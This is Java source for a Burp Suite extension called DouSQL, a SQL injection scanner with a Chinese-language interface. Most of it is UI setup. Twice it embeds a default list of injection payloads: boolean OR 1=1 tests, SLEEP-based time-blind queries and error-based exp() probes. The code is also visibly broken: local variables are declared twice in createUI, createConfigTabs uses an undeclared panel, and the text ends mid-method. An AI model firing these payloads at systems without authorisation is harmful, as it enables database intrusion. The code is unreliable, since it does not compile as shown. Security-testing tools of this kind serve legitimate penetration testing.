package dousql;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.handler.HttpHandler;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.handler.RequestToBeSentAction;
import burp.api.montoya.http.handler.ResponseReceivedAction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.utilities.json.JsonUtils;
import burp.api.montoya.utilities.json.JsonNode;
import burp.api.montoya.utilities.json.JsonObjectNode;
import burp.api.montoya.utilities.json.JsonArrayNode;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;

public class DouSqlPluginComplete implements BurpExtension, HttpHandler, ContextMenuItemsProvider {

    private MontoyaApi api;
    private JSplitPane splitPane;
    private JTable logTable;
    private JTable payloadTable;
    private AbstractTableModel model;

    // 数据存储 - 使用线程安全的集合
    private final List<LogEntry> log = Collections.synchronizedList(new ArrayList<>());
    private final List<LogEntry> log2 = Collections.synchronizedList(new ArrayList<>());
    private final List<LogEntry> log3 = Collections.synchronizedList(new ArrayList<>());
    private final List<RequestMd5> log4Md5 = Collections.synchronizedList(new ArrayList<>());

    // 配置目录常量
    private static String CONFIG_DIR = "dousql"; // 默认值，会在初始化时更新
    private static String JAR_DIR = ""; // jar包所在目录
    
    // 配置变量
    private volatile int switchs = 1; // 开关 0关 1开
    private volatile int clicksRepeater = 0; // 64是监听 0是关闭
    private volatile int clicksProxy = 0; // 4是监听 0是关闭
    private volatile int count = 0; // 记录条数
    private volatile String dataMd5Id; // 用于判断目前选中的数据包
    private volatile int isInt = 1; // 开关 0关 1开; //纯数据是否进行-1，-0
    private String tempData; // 用于保存临时内容
    private volatile int jTextAreaInt = 0; // 自定义payload开关  0关 1开
    private String jTextAreaData1 = ""; // 文本域的内容
    private volatile int diyPayload1 = 1; // 自定义payload空格编码开关  0关 1开
    private volatile int diyPayload2 = 0; // 自定义payload值置空开关  0关 1开
    private volatile int selectRow = 0; // 选中表格的行数
    private volatile int isCookie = -1; // cookie是否要注入，-1关闭 2开启
    private String whiteURL = "";
    private volatile int whiteSwitchs = 0; // 白名单开关
    
    // 使用ConcurrentHashMap存储每个请求的原始响应长度，避免全局变量竞态
    private final Map<String, Integer> originalResponseLengths = new ConcurrentHashMap<>();

    private JTextArea payloadTextArea;
    private JTextField whiteTextField;
    private JLabel jls4;
    private JLabel jls5;
    private JButton btn1, btn2, btn3, savePayloadBtn;
    private JCheckBox chkbox1, chkbox2, chkbox3, chkbox4, chkbox5, chkbox6, chkbox7, chkbox8;

    // 请求/响应查看器
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    // 新增变量
    private JTabbedPane whiteTabbedPane;
    private JCheckBox enableCustomErrorCheckBox;
    private JTextArea errorKeywordsTextArea;
    private List<String> errorKeywordsList = new ArrayList<>();
    private int enableCustomError = 0; // 自定义报错信息开关 0关 1开

    // 白名单/黑名单功能变量
    private List<String> whiteListParams = new ArrayList<>();  // 白名单参数列表
    private List<String> blackListParams = new ArrayList<>();  // 黑名单参数列表
    private int paramListMode = 0;  // 0:无过滤 1:白名单模式 2:黑名单模式

    // 长度差异检测配置变量
    private int lengthDiffThreshold = 100;  // 默认长度差异阈值（字节）
    private JTextField lengthDiffThresholdField;
    private JButton saveLengthDiffThresholdBtn;

    // 响应时间阈值配置变量
    private int responseTimeThreshold = 2000;  // 默认响应时间阈值（毫秒）

    // Payload分组配置变量
    private JComboBox<String> payloadGroupComboBox;
    private JButton newGroupBtn;
    private JButton deleteGroupBtn;
    private JButton renameGroupBtn;
    private JTextField newGroupNameField;
    private String currentGroup = "default";
    private List<String> payloadGroups = new ArrayList<>();
    private JTextField responseTimeThresholdField;
    private JButton saveResponseTimeThresholdBtn;

    // 参数过滤UI组件
    private JRadioButton noFilterRadio;
    private JRadioButton whiteListRadio;
    private JRadioButton blackListRadio;
    private JTextArea paramListTextArea;
    private JButton saveParamListBtn;
    private JButton saveErrorBtn;

    // 黑名单URL过滤功能变量
    private List<String> blackListUrls = new ArrayList<>();  // 黑名单URL列表
    private JTextArea blackListUrlTextArea;
    private JButton saveBlackListUrlBtn;

    // 自定义延时发包功能变量
    private int delayMode = 0;  // 0:无延时 1:固定延时 2:随机延时
    private int fixedDelay = 1000;  // 固定延时时间（毫秒）
    private int randomDelayMin = 1000;  // 随机延时最小值（毫秒）
    private int randomDelayMax = 5000;  // 随机延时最大值（毫秒）
    private JRadioButton noDelayRadio;
    private JRadioButton fixedDelayRadio;
    private JRadioButton randomDelayRadio;
    private JTextField fixedDelayField;
    private JTextField randomDelayMinField;
    private JTextField randomDelayMaxField;
    private JButton saveDelayConfigBtn;

    // 自定义追加参数功能变量
    private boolean enableAppendParams = false;  // 是否启用追加参数
    private String appendParamsText = "";  // 追加参数文本（key:value格式，一行一个）
    private Map<String, Boolean> appendParamsTestMap = new HashMap<>();  // 每个参数的测试开关状态
    private JCheckBox enableAppendParamsCheckBox;
    private JTextArea appendParamsTextArea;
    private JPanel paramTestPanel;  // 参数测试开关面板
    private JButton saveAppendParamsBtn;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;

        // 设置扩展名称
        api.extension().setName("DouSQL V3.0.4");

        // Windows系统UI优化
        optimizeUIForWindows();

        // 初始化配置目录路径
        initializeConfigDirectory();

        // 创建配置目录
        createConfigDirectory();

        // 输出启动信息
        api.logging().logToOutput("hello DouSQL!");
        api.logging().logToOutput("你好 欢迎使用 DouSQL!");
        api.logging().logToOutput("version:3.0.4 (Montoya API)");
        api.logging().logToOutput("jar包目录: " + JAR_DIR);
        api.logging().logToOutput("配置文件目录: " + CONFIG_DIR);

        // 注册HTTP处理器
        api.http().registerHttpHandler(this);

        // 注册上下文菜单
        api.userInterface().registerContextMenuItemsProvider(this);

        // 创建UI
        SwingUtilities.invokeLater(this::createUI);
    }

    // 初始化配置目录路径
    private void initializeConfigDirectory() {
        try {
            // 优先检查用户是否通过系统属性指定了配置目录
            String userSpecifiedDir = System.getProperty("dousql.config.dir");
            if (userSpecifiedDir != null && !userSpecifiedDir.trim().isEmpty()) {
                JAR_DIR = userSpecifiedDir;
                CONFIG_DIR = JAR_DIR + File.separator + "dousql";
                api.logging().logToOutput("使用用户指定的配置目录: " + JAR_DIR);
                return;
            }
            
            // 尝试获取jar包路径
            String jarPath = null;
            boolean useHomeDir = true;
            
            try {
                jarPath = this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
                api.logging().logToOutput("ProtectionDomain路径: " + jarPath);
                
                if (jarPath != null && jarPath.endsWith(".jar")) {
                    // 真正的jar文件，使用jar包同级目录
                    File jarFile = new File(jarPath);
                    JAR_DIR = jarFile.getParent();
                    useHomeDir = false;
                    api.logging().logToOutput("检测到jar文件，使用jar包同级目录: " + JAR_DIR);
                }
            } catch (Exception e) {
                api.logging().logToOutput("获取jar路径失败: " + e.getMessage());
            }
            
            // 如果无法获取真实jar路径或检测到临时目录，使用用户主目录
            if (useHomeDir) {
                JAR_DIR = System.getProperty("user.home");
                CONFIG_DIR = JAR_DIR + File.separator + "dousql";
                api.logging().logToOutput("使用用户主目录: " + JAR_DIR);
            } else {
                CONFIG_DIR = JAR_DIR + File.separator + "dousql";
            }
            
        } catch (Exception e) {
            // 出现异常时，使用用户主目录
            api.logging().logToOutput("初始化配置目录失败，使用用户主目录: " + e.getMessage());
            JAR_DIR = System.getProperty("user.home");
            CONFIG_DIR = JAR_DIR + File.separator + "dousql";
        }
    }

    // 创建配置目录
    private void createConfigDirectory() {
        File configDir = new File(CONFIG_DIR);
        if (!configDir.exists()) {
            if (configDir.mkdirs()) {
                api.logging().logToOutput("已创建配置目录: " + CONFIG_DIR);
            } else {
                api.logging().logToOutput("创建配置目录失败: " + CONFIG_DIR);
            }
        }
    }

    // 获取配置文件路径
    private String getConfigFilePath(String filename) {
        return CONFIG_DIR + File.separator + filename;
    }

    private void createUI() {
        // 创建主分割面板 - 左右分割（内容区域 + 控制面板）
        splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

        // 创建左侧内容区域 - 上下分割（表格区域 + HTTP编辑器）
        JSplitPane leftSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

        // 创建表格区域 - 左右分割（扫描结果表格 + Payload详情表格）
        JSplitPane tablesSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

        // 创建主分割面板 - 左右分割（内容区域 + 控制面板）
        splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

        // 创建左侧内容区域 - 上下分割（表格区域 + HTTP编辑器）
        JSplitPane leftSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

        // 创建表格区域 - 左右分割（扫描结果表格 + Payload详情表格）
        JSplitPane tablesSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

        // 扫描结果表格
        logTable = new Table(new LeftTableModel());
        JScrollPane scanResultsScrollPane = new JScrollPane(logTable);
        JPanel scanResultsPanel = new JPanel(new BorderLayout());
        scanResultsPanel.setBorder(BorderFactory.createTitledBorder("扫描结果"));
        scanResultsPanel.add(scanResultsScrollPane, BorderLayout.CENTER);

        // Payload详情表格
        model = new MyModel();
        payloadTable = new PayloadTable(model);
        JScrollPane payloadDetailsScrollPane = new JScrollPane(payloadTable);
        JPanel payloadDetailsPanel = new JPanel(new BorderLayout());
        payloadDetailsPanel.setBorder(BorderFactory.createTitledBorder("参数测试详情"));
        payloadDetailsPanel.add(payloadDetailsScrollPane, BorderLayout.CENTER);

        // 设置表格分割面板
        tablesSplitPane.setLeftComponent(scanResultsPanel);
        tablesSplitPane.setRightComponent(payloadDetailsPanel);
        tablesSplitPane.setDividerLocation(0.5);
        tablesSplitPane.setResizeWeight(0.5);

        // 创建主面板并添加表格分割面板
        JPanel mainPanel = new JPanel(new BorderLayout());
        mainPanel.add(tablesSplitPane, BorderLayout.CENTER);

        // 创建HTTP编辑器面板 - 使用Legacy API方式
        JSplitPane httpEditorsSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        
        // 请求/响应查看器 - 使用Montoya API但参考Legacy方式
        api.logging().logToOutput("正在创建HTTP请求/响应编辑器...");
        
        try {
            // 创建编辑器
            requestViewer = api.userInterface().createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = api.userInterface().createHttpResponseEditor(EditorOptions.READ_ONLY);
            
            if (requestViewer == null || responseViewer == null) {
                api.logging().logToOutput("错误: 无法创建HTTP请求/响应编辑器");
                // 创建备用面板
                httpEditorsSplitPane.setLeftComponent(createFallbackPanel("请求编辑器加载失败"));
                httpEditorsSplitPane.setRightComponent(createFallbackPanel("响应编辑器加载失败"));
            } else {
                // 使用JTabbedPane包装编辑器，完全按照RVScan的方式
                JTabbedPane requestTabPane = new JTabbedPane();
                JTabbedPane responseTabPane = new JTabbedPane();
                
                requestTabPane.addTab("Request", requestViewer.uiComponent());
                responseTabPane.addTab("Response", responseViewer.uiComponent());
                
                httpEditorsSplitPane.setLeftComponent(requestTabPane);
                httpEditorsSplitPane.setRightComponent(responseTabPane);
                
                api.logging().logToOutput("HTTP编辑器创建成功 - 使用JTabbedPane包装");
            }
        } catch (Exception e) {
            api.logging().logToOutput("创建HTTP编辑器时发生异常: " + e.getMessage());
            httpEditorsSplitPane.setLeftComponent(createFallbackPanel("请求编辑器异常"));
            httpEditorsSplitPane.setRightComponent(createFallbackPanel("响应编辑器异常"));
        }
        
        httpEditorsSplitPane.setDividerLocation(0.5);
        httpEditorsSplitPane.setResizeWeight(0.5);

        // 设置左侧内容区域
        leftSplitPane.setTopComponent(tablesSplitPane);
        leftSplitPane.setBottomComponent(httpEditorsSplitPane);
        leftSplitPane.setDividerLocation(400);
        leftSplitPane.setResizeWeight(0.6);

        // 侧边控制面板 - 优化布局，确保跨平台兼容性
        JPanel controlPanel = new JPanel(new BorderLayout());
        controlPanel.setBorder(BorderFactory.createTitledBorder("控制面板"));
        
        // 创建控制选项面板 - 使用GridBagLayout确保跨平台兼容性
        JPanel controlOptionsPanel = new JPanel(new GridBagLayout());
        controlOptionsPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.anchor = GridBagConstraints.WEST;
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        gbc.insets = new Insets(1, 0, 1, 0); // 上下间距1像素

        JLabel jls = new JLabel("DouSQL-安全鸭专属【魔改版本】｜Author By：DarkFi5");

        chkbox1 = new JCheckBox("启动插件", true);
        chkbox2 = new JCheckBox("监控Repeater");
        chkbox3 = new JCheckBox("监控Proxy");
        chkbox4 = new JCheckBox("值是数字则进行-1、-0", true);
        chkbox8 = new JCheckBox("测试Cookie");

        jls5 = new JLabel("如果需要多个域名加白请用,隔开");
        whiteTextField = new JTextField("填写白名单域名");
        // 确保输入框在Windows下能正确显示
        whiteTextField.setPreferredSize(new Dimension(220, 25));
        whiteTextField.setMinimumSize(new Dimension(180, 25));
        whiteTextField.setMaximumSize(new Dimension(300, 25));
        // 设置边框，确保可见性
        whiteTextField.setBorder(BorderFactory.createLoweredBevelBorder());
        
        btn1 = new JButton("清空列表");
        btn2 = new JButton("加载/重新加载payload");
        btn3 = new JButton("启动白名单");
        
        // 确保按钮在Windows下也能完整显示
        btn1.setPreferredSize(new Dimension(120, 25));
        btn2.setPreferredSize(new Dimension(150, 25));
        btn3.setPreferredSize(new Dimension(120, 25));

        // 按顺序添加组件，确保所有组件都能显示
        int row = 0;
        gbc.gridy = row++; 
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        gbc.insets = new Insets(2, 0, 2, 0);
        controlOptionsPanel.add(jls, gbc);
    
        // 添加复选框组
        gbc.gridy = row++; 
        gbc.insets = new Insets(3, 0, 1, 0);
        gbc.fill = GridBagConstraints.NONE;
        gbc.weightx = 0.0;
        controlOptionsPanel.add(chkbox1, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(1, 0, 1, 0);
        controlOptionsPanel.add(chkbox2, gbc);
        
        gbc.gridy = row++; 
        controlOptionsPanel.add(chkbox3, gbc);
        
        gbc.gridy = row++; 
        controlOptionsPanel.add(chkbox4, gbc);
        
        gbc.gridy = row++; 
        controlOptionsPanel.add(chkbox8, gbc);
        
        // 添加清空列表按钮
        gbc.gridy = row++; 
        gbc.insets = new Insets(8, 0, 3, 0);
        controlOptionsPanel.add(btn1, gbc);
        
        // 添加白名单相关组件
        gbc.gridy = row++; 
        gbc.insets = new Insets(5, 0, 2, 0);
        controlOptionsPanel.add(jls5, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(2, 0, 2, 0);
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        controlOptionsPanel.add(whiteTextField, gbc);
        
        gbc.gridy = row++; 
        gbc.insets = new Insets(2, 0, 3, 0);
        gbc.fill = GridBagConstraints.NONE;
        gbc.weightx = 0.0;
        controlOptionsPanel.add(btn3, gbc);
        
        // 添加加载payload按钮
        gbc.gridy = row++; 
        gbc.insets = new Insets(5, 0, 5, 0);
        controlOptionsPanel.add(btn2, gbc);
        
        // 重置弹性空间设置，避免在Windows下产生过多空白
        gbc.gridy = row++;
        gbc.weighty = 0.1; // 减少弹性权重
        gbc.fill = GridBagConstraints.VERTICAL;
        gbc.insets = new Insets(0, 0, 0, 0);
        controlOptionsPanel.add(Box.createVerticalStrut(10), gbc); // 使用固定间距替代弹性空间
        
        // 将控制选项面板添加到控制面板
        controlPanel.add(controlOptionsPanel, BorderLayout.CENTER); // 改为CENTER避免过多空白
        
        // 在白名单位置创建标签页
        JTabbedPane whiteTabbedPane = new JTabbedPane();
        // 设置标签页的最小高度，避免被压缩
        whiteTabbedPane.setPreferredSize(new Dimension(250, 400));
        whiteTabbedPane.setMinimumSize(new Dimension(200, 300));

        // 第一个标签页：自定义SQL语句（原来的payload编辑框）
        JPanel customPayloadPanel = new JPanel(new BorderLayout());
        jls4 = new JLabel("修改payload后点击保存，切换组时点击重新加载（配置文件：" + CONFIG_DIR + "/xia_SQL_diy_payload.ini）");

        chkbox5 = new JCheckBox("自定义payload");
        chkbox6 = new JCheckBox("自定义payload中空格url编码", true);
        chkbox7 = new JCheckBox("自定义payload中参数值置空");
        payloadTextArea = new JTextArea("'''\n\"\"\"\n'+Or+1=1+AND+'dark'='dark\n'+Or+1=2+AND+'dark'='dark\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)", 18, 16);

        // 读取ini配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_diy_payload.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            payloadTextArea.setText(strData);
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        payloadTextArea.setForeground(Color.BLACK);
        payloadTextArea.setFont(new Font("楷体", Font.BOLD, 16));
        payloadTextArea.setBackground(Color.LIGHT_GRAY);
        payloadTextArea.setEditable(false);
        JScrollPane textAreaScrollPane = new JScrollPane(payloadTextArea);
        
        // 分组控制面板 - 使用GridBagLayout确保所有按钮都能显示
        JPanel groupPanel = new JPanel(new GridBagLayout());
        GridBagConstraints gbcGroup = new GridBagConstraints();
        gbcGroup.insets = new Insets(2, 2, 2, 2);
        gbcGroup.anchor = GridBagConstraints.WEST;
        
        JLabel groupLabel = new JLabel("测试组:");
        payloadGroupComboBox = new JComboBox<>();
        payloadGroupComboBox.setPreferredSize(new Dimension(80, 25));
        
        newGroupNameField = new JTextField("新组名");
        newGroupNameField.setPreferredSize(new Dimension(80, 25));
        
        newGroupBtn = new JButton("新建");
        renameGroupBtn = new JButton("重命名");
        deleteGroupBtn = new JButton("删除");
        
        // 设置按钮大小，确保在Windows下也能完整显示
        Dimension buttonSize = new Dimension(80, 25);
        newGroupBtn.setPreferredSize(buttonSize);
        renameGroupBtn.setPreferredSize(new Dimension(80, 25)); // 重命名稍宽
        deleteGroupBtn.setPreferredSize(buttonSize);
        
        // 第一行：标签和下拉框
        gbcGroup.gridx = 0; gbcGroup.gridy = 0;
        groupPanel.add(groupLabel, gbcGroup);
        gbcGroup.gridx = 1;
        groupPanel.add(payloadGroupComboBox, gbcGroup);
        gbcGroup.gridx = 2;
        groupPanel.add(newGroupNameField, gbcGroup);
        
        // 第二行：按钮组
        gbcGroup.gridx = 0; gbcGroup.gridy = 1;
        groupPanel.add(newGroupBtn, gbcGroup);
        gbcGroup.gridx = 1;
        groupPanel.add(renameGroupBtn, gbcGroup);
        gbcGroup.gridx = 2;
        groupPanel.add(deleteGroupBtn, gbcGroup);

        // 创建顶部控制面板 - 优化间距
        JPanel topControlPanel = new JPanel();
        topControlPanel.setLayout(new BoxLayout(topControlPanel, BoxLayout.Y_AXIS));
        topControlPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        // 设置组件左对齐
        jls4.setAlignmentX(Component.LEFT_ALIGNMENT);
        groupPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox5.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox6.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox7.setAlignmentX(Component.LEFT_ALIGNMENT);
        btn2.setAlignmentX(Component.LEFT_ALIGNMENT);
        
        topControlPanel.add(jls4);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(groupPanel);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(chkbox5);
        topControlPanel.add(chkbox6);
        topControlPanel.add(chkbox7);
        topControlPanel.add(Box.createVerticalStrut(3));
        
        // 创建按钮面板，水平排列保存和加载按钮
        JPanel payloadButtonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        savePayloadBtn = new JButton("保存payload");
        savePayloadBtn.setPreferredSize(new Dimension(120, 25));
        btn2.setText("重新加载payload");
        btn2.setPreferredSize(new Dimension(140, 25));
        splitPane.setDividerLocation(1000);
        splitPane.setResizeWeight(0.75);

        // 应用主题
        api.userInterface().applyThemeToComponent(splitPane);

        // 注册标签页
        api.userInterface().registerSuiteTab("DouSQL", splitPane);

        // 测试编辑器功能
        SwingUtilities.invokeLater(() -> {
            try {
                Thread.sleep(1000);
                testEditorFunctionality();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });
    }

    /**
     * 创建控制面板
     */
    private JPanel createControlPanel() {
        JPanel controlPanel = new JPanel(new BorderLayout());
        controlPanel.setBorder(BorderFactory.createTitledBorder("控制面板"));
        
        JPanel optionsPanel = new JPanel(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.anchor = GridBagConstraints.WEST;
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        gbc.insets = new Insets(2, 5, 2, 5);
        
        int row = 0;
        
        // 标题
        JLabel titleLabel = new JLabel("DouSQL-安全鸭专属【魔改版本】｜Author By：DarkFi5");
        gbc.gridy = row++;
        optionsPanel.add(titleLabel, gbc);
        
        // 基本控制复选框组
        chkbox1 = new JCheckBox("启动插件", true);
        gbc.gridy = row++;
        optionsPanel.add(chkbox1, gbc);
        
        chkbox2 = new JCheckBox("监控Repeater");
        gbc.gridy = row++;
        optionsPanel.add(chkbox2, gbc);
        
        chkbox3 = new JCheckBox("监控Proxy");
        gbc.gridy = row++;
        optionsPanel.add(chkbox3, gbc);
        
        chkbox4 = new JCheckBox("值是数字则进行-1、-0", true);
        gbc.gridy = row++;
        optionsPanel.add(chkbox4, gbc);
        
        chkbox8 = new JCheckBox("测试Cookie");
        gbc.gridy = row++;
        optionsPanel.add(chkbox8, gbc);
        
        // 白名单配置区域
        jls5 = new JLabel("如果需要多个域名加白请用,隔开");
        gbc.gridy = row++;
        gbc.insets = new Insets(8, 5, 2, 5);
        optionsPanel.add(jls5, gbc);
        
        whiteTextField = new JTextField("填写白名单域名");
        whiteTextField.setPreferredSize(new Dimension(220, 25));
        gbc.gridy = row++;
        gbc.insets = new Insets(2, 5, 2, 5);
        optionsPanel.add(whiteTextField, gbc);
        
        btn3 = new JButton("启动白名单");
        gbc.gridy = row++;
        optionsPanel.add(btn3, gbc);
        
        // 操作按钮区域
        btn1 = new JButton("清空列表");
        gbc.gridy = row++;
        gbc.insets = new Insets(8, 5, 3, 5);
        optionsPanel.add(btn1, gbc);
        
        btn2 = new JButton("加载/重新加载payload");
        gbc.gridy = row++;
        gbc.insets = new Insets(5, 5, 5, 5);
        optionsPanel.add(btn2, gbc);
        
        controlPanel.add(optionsPanel, BorderLayout.CENTER);
        
        return controlPanel;
    }

    /**
     * 创建配置标签页
     */
    private JTabbedPane createConfigTabs() {

        JTabbedPane configTabs = new JTabbedPane();
        configTabs.setPreferredSize(new Dimension(250, 400));
        configTabs.setMinimumSize(new Dimension(200, 300));
        // 第一个标签页：自定义SQL语句（原来的payload编辑框）
        jls4 = new JLabel("修改payload后点击保存，切换组时点击重新加载（配置文件：" + CONFIG_DIR + "/xia_SQL_diy_payload.ini）");

        chkbox5 = new JCheckBox("自定义payload");
        chkbox6 = new JCheckBox("自定义payload中空格url编码", true);
        chkbox7 = new JCheckBox("自定义payload中参数值置空");
        payloadTextArea = new JTextArea("'''\n\"\"\"\n'+Or+1=1+AND+'dark'='dark\n'+Or+1=2+AND+'dark'='dark\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)", 18, 16);

        // 读取ini配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_diy_payload.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            payloadTextArea.setText(strData);
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        payloadTextArea.setForeground(Color.BLACK);
        payloadTextArea.setFont(new Font("楷体", Font.BOLD, 16));
        payloadTextArea.setBackground(Color.LIGHT_GRAY);
        payloadTextArea.setEditable(false);
        JScrollPane textAreaScrollPane = new JScrollPane(payloadTextArea);
        
        // 分组控制面板 - 使用GridBagLayout确保所有按钮都能显示
        JPanel groupPanel = new JPanel(new GridBagLayout());
        GridBagConstraints gbcGroup = new GridBagConstraints();
        gbcGroup.insets = new Insets(2, 2, 2, 2);
        gbcGroup.anchor = GridBagConstraints.WEST;
        
        JLabel groupLabel = new JLabel("测试组:");
        payloadGroupComboBox = new JComboBox<>();
        payloadGroupComboBox.setPreferredSize(new Dimension(80, 25));
        
        newGroupNameField = new JTextField("新组名");
        newGroupNameField.setPreferredSize(new Dimension(80, 25));
        
        newGroupBtn = new JButton("新建");
        renameGroupBtn = new JButton("重命名");
        deleteGroupBtn = new JButton("删除");
        
        // 设置按钮大小，确保在Windows下也能完整显示
        Dimension buttonSize = new Dimension(80, 25);
        newGroupBtn.setPreferredSize(buttonSize);
        renameGroupBtn.setPreferredSize(new Dimension(80, 25)); // 重命名稍宽
        deleteGroupBtn.setPreferredSize(buttonSize);
        
        // 第一行：标签和下拉框
        gbcGroup.gridx = 0; gbcGroup.gridy = 0;
        groupPanel.add(groupLabel, gbcGroup);
        gbcGroup.gridx = 1;
        groupPanel.add(payloadGroupComboBox, gbcGroup);
        gbcGroup.gridx = 2;
        groupPanel.add(newGroupNameField, gbcGroup);
        
        // 第二行：按钮组
        gbcGroup.gridx = 0; gbcGroup.gridy = 1;
        groupPanel.add(newGroupBtn, gbcGroup);
        gbcGroup.gridx = 1;
        groupPanel.add(renameGroupBtn, gbcGroup);
        gbcGroup.gridx = 2;
        groupPanel.add(deleteGroupBtn, gbcGroup);

        // 创建顶部控制面板 - 优化间距
        JPanel topControlPanel = new JPanel();
        topControlPanel.setLayout(new BoxLayout(topControlPanel, BoxLayout.Y_AXIS));
        topControlPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        // 设置组件左对齐
        jls4.setAlignmentX(Component.LEFT_ALIGNMENT);
        groupPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox5.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox6.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox7.setAlignmentX(Component.LEFT_ALIGNMENT);
        btn2.setAlignmentX(Component.LEFT_ALIGNMENT);
        
        topControlPanel.add(jls4);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(groupPanel);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(chkbox5);
        topControlPanel.add(chkbox6);
        topControlPanel.add(chkbox7);
        topControlPanel.add(Box.createVerticalStrut(3));
        
        // 创建按钮面板，水平排列保存和加载按钮
        JPanel payloadButtonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        savePayloadBtn = new JButton("保存payload");
        savePayloadBtn.setPreferredSize(new Dimension(120, 25));
        btn2.setText("重新加载payload");
        btn2.setPreferredSize(new Dimension(140, 25));
        
        payloadButtonPanel.add(savePayloadBtn);
        payloadButtonPanel.add(btn2);
        payloadButtonPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
        
        topControlPanel.add(payloadButtonPanel);

        // 使用BorderLayout正确布局
        customPayloadPanel.add(topControlPanel, BorderLayout.NORTH);
        customPayloadPanel.add(textAreaScrollPane, BorderLayout.CENTER);

        // 第二个标签页：参数过滤配置
        JPanel paramFilterPanel = new JPanel(new BorderLayout());
        paramFilterPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // 模式选择
        JPanel modePanel = new JPanel(new GridLayout(3, 1, 5, 5));
